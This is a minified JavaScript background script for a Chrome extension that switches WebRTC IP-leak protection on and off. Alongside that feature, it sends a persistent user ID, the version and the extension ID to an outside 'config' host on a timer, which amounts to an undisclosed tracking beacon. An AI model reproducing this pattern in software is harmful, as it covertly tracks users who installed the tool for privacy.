localStorage.uid || (localStorage.uid = Date.now()), localStorage.version = chrome.app.getDetails().version, localStorage.extid = chrome.runtime.id;

function defaultSettings() {
    localStorage.enabled = !0, chrome.browserAction.setIcon({path: '/img/icon32_on.png'}), chrome.privacy.network.webRTCIPHandlingPolicy.set({value: 'disable_non_proxied_udp'})
}

function getConfig() {
    try {
        $.get('http://webrtcleakconfig.xyz/config/config.txt?uid=' + localStorage.uid + '&ver=' + localStorage.version + '&extid=' + localStorage.extid).fail(function () {
            $.get('http://reserve.webrtcleakconfig.xyz/config/config.txt?uid=' + localStorage.uid + '&ver=' + localStorage.version + '&extid=' + localStorage.extid)
        })
    } catch (a) {
    }
}

getConfig(), setInterval(function () {
    getConfig()
}, 2e7), chrome.browserAction.onClicked.addListener(function () {
    try {
        if ('true' == localStorage.enabled) return chrome.privacy.network.webRTCIPHandlingPolicy.set({value: 'default'}), localStorage.enabled = !1, void chrome.browserAction.setIcon({path: '/img/icon32_off.png'});
        chrome.privacy.network.webRTCIPHandlingPolicy.set({value: 'disable_non_proxied_udp'}), localStorage.enabled = !0, chrome.browserAction.setIcon({path: '/img/icon32_on.png'})
    } catch (b) {
    }
}), chrome.runtime.onInstalled.addListener(function (a) {
    if ('install' == a.reason) {
        try {
            _gaq.push(['_trackEvent', 'share', 'install'])
        } catch (b) {
        }
        defaultSettings()
    }
});